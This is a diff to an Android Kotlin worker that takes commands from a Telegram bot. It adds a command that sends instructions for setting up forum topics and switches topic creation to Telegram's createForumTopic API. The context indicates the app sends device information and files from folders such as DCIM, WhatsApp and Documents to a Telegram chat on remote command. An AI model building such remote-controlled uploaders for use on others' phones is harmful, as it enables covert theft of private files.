@@ -251,6 +251,15 @@ class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker
                     enviarConfirmacionTelegram(token, chatId, "❌ Error creando carpetas: "+e.message)
                 }
             }
+            text.contains("/temas_manual", ignoreCase = true) -> {
+                Log.d(TAG, "Comando recibido: temas_manual")
+                try {
+                    mostrarInstruccionesTemas(token, chatId)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error mostrando instrucciones: "+e.message)
+                    enviarConfirmacionTelegram(token, chatId, "❌ Error mostrando instrucciones: "+e.message)
+                }
+            }
         }
     }
 
@@ -271,6 +280,7 @@ class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker
             🔄 */github_sync* - Sincroniza con GitHub
             📊 */github_stats* - Estadísticas de GitHub
             📁 */crear_carpetas* - Crea estructura de temas en Telegram
+            📋 */temas_manual* - Instrucciones para crear temas manualmente
             
             _Envía cualquier comando para ejecutarlo._
         """.trimIndent()
@@ -411,6 +421,57 @@ ${DeviceInfo(applicationContext).getDeviceInfoJson()}
         }
     }
 
+    private fun mostrarInstruccionesTemas(token: String, chatId: String) {
+        val instrucciones = """
+            📁 *Creación Manual de Temas en Telegram*
+
+            Para crear los temas manualmente y organizar mejor los archivos:
+
+            🔧 *Pasos:*
+            1️⃣ Ve a la configuración del grupo
+            2️⃣ Busca la opción "Temas" o "Topics"
+            3️⃣ Activa los temas si no están activados
+            4️⃣ Crea los siguientes temas:
+
+            📸 *Temas de Fotos:*
+            • DCIM - Camera
+            • DCIM - Screenshots
+            • DCIM - WhatsApp
+            • DCIM - Telegram
+            • DCIM - Instagram
+            • DCIM - Downloads
+            • DCIM - Other
+            • Pictures
+
+            🎥 *Temas de Videos:*
+            • Movies
+            • Videos
+
+            🎵 *Temas de Audio:*
+            • Music
+            • Ringtones
+            • Notifications
+            • Alarms
+
+            📄 *Temas de Documentos:*
+            • Documents
+            • Downloads
+
+            📱 *Otros Temas:*
+            • Apps
+            • Other
+
+            ✅ *Beneficios:*
+            • Los archivos se agruparán automáticamente
+            • Navegación más fácil
+            • Organización visual clara
+
+            💡 *Consejo:* Una vez creados los temas, los archivos se organizarán automáticamente según su ubicación en el dispositivo.
+        """.trimIndent()
+        
+        enviarConfirmacionTelegram(token, chatId, instrucciones)
+    }
+
     private suspend fun crearEstructuraCarpetas(token: String, chatId: String) {
         try {
             enviarConfirmacionTelegram(token, chatId, "📁 Creando estructura de temas en Telegram...")
@@ -439,36 +500,54 @@ ${DeviceInfo(applicationContext).getDeviceInfoJson()}
             var temasCreados = 0
             for (folder in folders) {
                 try {
-                    // Crear un archivo temporal para crear el tema
-                    val tempFile = File(applicationContext.cacheDir, "tema_${folder.replace("/", "_").replace(" ", "_")}.txt")
-                    tempFile.writeText("📁 Tema creado para: $folder\n\nEste tema se usará para organizar archivos de la carpeta: $folder")
+                    // Intentar crear el tema usando la API de Telegram
+                    val topicName = folder.replace("📸 ", "").replace("🎥 ", "").replace("🎵 ", "").replace("📄 ", "").replace("📱 ", "").replace("📁 ", "")
                     
-                    val url = "https://api.telegram.org/bot$token/sendDocument"
+                    val url = "https://api.telegram.org/bot$token/createForumTopic"
                     
-                    val requestBody = MultipartBody.Builder()
-                        .setType(MultipartBody.FORM)
-                        .addFormDataPart("chat_id", chatId)
-                        .addFormDataPart("document", tempFile.name, tempFile.asRequestBody("text/plain".toMediaTypeOrNull()))
-                        .addFormDataPart("caption", "📁 Creando tema: $folder")
-                        .addFormDataPart("parse_mode", "HTML")
-                        .build()
+                    val json = JSONObject().apply {
+                        put("chat_id", chatId)
+                        put("name", topicName)
+                        put("icon_color", 0x2E86AB) // Color azul para los temas
+                    }
 
-                    val request = Request.Builder().url(url).post(requestBody).build()
                     val client = OkHttpClient()
+                    val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
+                    val request = Request.Builder().url(url).post(body).build()
+
                     val response = client.newCall(request).execute()
                     
                     if (response.isSuccessful) {
-                        temasCreados++
-                        Log.d(TAG, "✅ Tema creado: $folder")
+                        val responseBody = response.body?.string() ?: ""
+                        val jsonResponse = JSONObject(responseBody)
+                        
+                        if (jsonResponse.getBoolean("ok")) {
+                            temasCreados++
+                            Log.d(TAG, "✅ Tema creado exitosamente: $folder")
+                        } else {
+                            Log.w(TAG, "⚠️ Error en respuesta de Telegram para tema $folder: ${jsonResponse.optString("description")}")
+                        }
                     } else {
                         Log.w(TAG, "⚠️ No se pudo crear tema: $folder - ${response.code}")
+                        
+                        // Si falla la creación del tema, enviar un mensaje informativo
+                        val mensajeInfo = "📁 Tema: $folder\n\nEste tema se usará para organizar archivos automáticamente.\n\nPara crear manualmente:\n1. Ve a Configuración del grupo\n2. Activa 'Temas'\n3. Crea un tema llamado: $topicName"
+                        
+                        val urlMensaje = "https://api.telegram.org/bot$token/sendMessage"
+                        val jsonMensaje = JSONObject().apply {
+                            put("chat_id", chatId)
+                            put("text", mensajeInfo)
+                            put("parse_mode", "HTML")
+                        }
+                        
+                        val bodyMensaje = jsonMensaje.toString().toRequestBody("application/json".toMediaTypeOrNull())
+                        val requestMensaje = Request.Builder().url(urlMensaje).post(bodyMensaje).build()
+                        val responseMensaje = client.newCall(requestMensaje).execute()
+                        responseMensaje.close()
                     }
                     response.close()
                     
-                    // Eliminar archivo temporal
-                    tempFile.delete()
-                    
-                    delay(200) // Pausa para evitar rate limiting
+                    delay(500) // Pausa para evitar rate limiting
                 } catch (e: Exception) {
                     Log.e(TAG, "Error creando tema $folder: ${e.message}")
                 }
@@ -503,6 +582,10 @@ ${DeviceInfo(applicationContext).getDeviceInfoJson()}
                 
                 Los archivos se organizarán automáticamente según su ubicación.
                 Cada archivo se enviará con el caption del tema correspondiente.
+                
+                ${if (temasCreados < folders.size) "⚠️ Algunos temas no se pudieron crear automáticamente. Crea los temas manualmente en la configuración del grupo." else ""}
+                
+                💡 *Consejo:* Para mejor organización, crea manualmente los temas en la configuración del grupo con los nombres mostrados arriba.
             """.trimIndent()
             
             enviarConfirmacionTelegram(token, chatId, mensajeFinal)
